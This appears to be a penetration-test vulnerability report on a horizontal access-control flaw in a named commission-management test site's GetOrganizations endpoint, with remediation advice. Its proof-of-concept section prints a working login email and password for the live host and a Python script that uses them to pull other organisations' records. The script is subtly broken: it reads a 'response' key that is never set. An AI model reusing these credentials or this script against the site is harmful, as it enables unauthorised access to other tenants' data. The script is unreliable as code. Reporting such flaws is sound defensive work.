# Horizontal Access Control Bypass: Organization Users Can Access Other Organizations' Data

**ID:** vuln-0002
**Severity:** HIGH
**Found:** 2026-02-26 11:53:15 UTC
**Target:** https://commissionstest.callippus.in
**Endpoint:** /api/Account/GetOrganizations
**Method:** GET
**CWE:** CWE-284
**CVSS:** 7.6

## Description

A critical horizontal access control vulnerability was discovered in the commission management application. Organization-level users can access sensitive data from other organizations, violating the principle of data isolation.

The vulnerability allows organization users to access the `/api/Account/GetOrganizations` endpoint, which returns data for multiple organizations including organization names, codes, types, and status information.

## Impact

Successful exploitation of this vulnerability allows organization users to:

1. **Access Sensitive Data**: View confidential information from other organizations including names, codes, and organizational structure
2. **Data Enumeration**: Enumerate all organizations in the system, facilitating targeted attacks
3. **Information Disclosure**: Obtain business intelligence about competitors or other entities in the system
4. **Violate Data Isolation**: Bypass the fundamental principle of multi-tenant data isolation

The business impact includes:
- Significant data privacy violations
- Potential regulatory compliance issues (GDPR, CCPA, etc.)
- Competitive intelligence exposure
- Increased risk of targeted attacks against specific organizations
- Erosion of customer trust in the platform's security

## Technical Analysis

The vulnerability exists due to insufficient access control checks on the `/api/Account/GetOrganizations` endpoint. The application fails to properly filter organization data based on the authenticated user's organization context.

**Vulnerable Endpoint:**
- `/api/Account/GetOrganizations` - Returns data for all organizations in the system

**Technical Details:**
- Organization users with "Organization" role can successfully access this endpoint
- The endpoint returns HTTP 200 status code with data for 19 organizations
- Each organization record contains sensitive information including:
  - `orgName`: Organization name
  - `orgCode`: Organization code
  - `orgType`: Organization type
  - `status`: Organization status
  - `level`: Organizational level

**Root Cause:**
The application implements multi-tenancy but fails to properly enforce data isolation at the API level. The `/api/Account/GetOrganizations` endpoint lacks proper filtering to ensure users can only access data from their own organization. This suggests either:
1. Missing organization context filtering in the API implementation
2. Incorrectly implemented access control checks
3. Overly permissive data access layer

## Proof of Concept

**Step-by-Step Reproduction:**

1. Authenticate as an Organization user (e.g., nlnarayana3858@gmail.com / User@1234)
2. Send a GET request to `/api/Account/GetOrganizations`
3. Observe that the request returns HTTP 200 with data for 19 organizations
4. Examine the response to see sensitive data from other organizations

**Proof of Concept Request:**

```
GET /api/Account/GetOrganizations HTTP/1.1
Host: commissionstest.callippus.in
Authorization: Bearer [Organization User Token]
```

**Sample Response Data:**
```json
[
  {
    "id": 1210,
    "orgTypeId": 414,
    "orgName": "Ritu Gupta",
    "orgCode": "EMP5009",
    "level": 0,
    "createdDate": "0001-01-01T00:00:00",
    "orgType": "Sales Team",
    "status": 1
  },
  {
    "id": 1211,
    "orgTypeId": 415,
    "orgName": "Polaris Product",
    "orgCode": "ORG001",
    "level": 1,
    "createdDate": "2025-04-25T11:32:51.832843+05:30",
    "orgType": "Organization",
    "status": 1
  },
  ...
]
```

```
import requests
import json
from urllib.parse import urljoin

# Configuration
BASE_URL = "https://commissionstest.callippus.in"
ORGANIZATION_CREDENTIALS = {
    "email": "nlnarayana3858@gmail.com",
    "password": "User@1234"
}

def authenticate(email, password):
    """Authenticate and return token"""
    url = urljoin(BASE_URL, "/api/authenticate")
    payload = {
        "email": email,
        "password": password,
        "rememberMe": False
    }

    response = requests.post(url, json=payload, verify=False)
    if response.status_code == 200:
        return response.json().get("id_token")
    return None

def test_organization_data_access(token):
    """Test access to organization data"""
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }

    # Test organizations endpoint
    org_url = urljoin(BASE_URL, "/api/Account/GetOrganizations")
    org_response = requests.get(org_url, headers=headers, verify=False)

    return {
        "url": org_url,
        "status": org_response.status_code,
        "length": len(org_response.text),
        "access_granted": org_response.status_code == 200,
        "data": None
    }

def main():
    print("=== Horizontal Access Control Bypass PoC ===")

    # Authenticate as organization user
    print("1. Authenticating as organization user...")
    token = authenticate(ORGANIZATION_CREDENTIALS["email"], ORGANIZATION_CREDENTIALS["password"])
    if not token:
        print("Authentication failed!")
        return

    print("2. Testing access to organization data...")
    result = test_organization_data_access(token)

    # Display results
    print("\n=== RESULTS ===")
    print(f"Organizations Endpoint: {result['url']}")
    print(f"  Status: {result['status']}")
    print(f"  Access Granted: {'YES (VULNERABLE)' if result['access_granted'] else 'NO'}")
    print(f"  Response Length: {result['length']}")

    if result['access_granted']:
        try:
            data = json.loads(result['response'].text)
            result['data'] = data

            print(f"\n  Number of Organizations: {len(data)}")
            print("  Sample Organization Data:")

            # Show first 3 organizations
            for i, org in enumerate(data[:3]):
                print(f"    {i+1}. {org.get('orgName', 'Unknown')} ({org.get('orgCode', 'N/A')})")
                print(f"       Type: {org.get('orgType', 'Unknown')}")
                print(f"       Status: {'Active' if org.get('status') == 1 else 'Inactive'}")

            if len(data) > 3:
                print(f"    ... and {len(data) - 3} more organizations")

        except:
            print(f"  Response: {result['response'].text[:200]}...")

    # Determine vulnerability status
    if result['access_granted'] and result['data'] and len(result['data']) > 1:
        print("\n⚠️  CRITICAL: Horizontal access control bypass vulnerability confirmed!")
        print("Organization user can access data from other organizations.")
    else:
        print("\n✅ No horizontal access control bypass detected.")

if __name__ == "__main__":
    main()
```

## Remediation

**Immediate Remediation Steps:**

1. **Implement Organization Context Filtering:**
   - Modify the `/api/Account/GetOrganizations` endpoint to filter results based on the authenticated user's organization
   - Ensure users can only access data from their own organization
   - Add organization context to all API requests and responses

2. **Review All Data Access Endpoints:**
   - Audit all endpoints that return organization-specific data
   - Implement proper filtering to ensure data isolation
   - Apply the principle of least privilege to all data access

3. **Implement Data Isolation at the Database Level:**
   - Use database schemas or separate tables for each organization
   - Implement row-level security to enforce data isolation
   - Ensure database queries include organization context filters

4. **Add Access Control Middleware:**
   - Implement middleware to validate organization context for all requests
   - Add explicit organization checks for all data access operations
   - Log and monitor access to organization data

**Long-Term Recommendations:**

1. **Implement Multi-Tenancy Security Framework:**
   - Develop a comprehensive multi-tenancy security framework
   - Implement tenant isolation at all application layers
   - Use attribute-based access control (ABAC) for fine-grained data access

2. **Conduct Security Testing:**
   - Perform penetration testing focused on multi-tenancy vulnerabilities
   - Implement automated security scanning for access control issues
   - Conduct code reviews focused on data isolation implementation

3. **Implement Monitoring and Auditing:**
   - Log all access to organization-specific data
   - Set up alerts for cross-organization data access attempts
   - Regularly audit data access patterns for anomalies

4. **Educate Development Team:**
   - Train developers on secure multi-tenancy implementation
   - Establish secure coding guidelines for data isolation
   - Implement security champions program to promote secure development practices

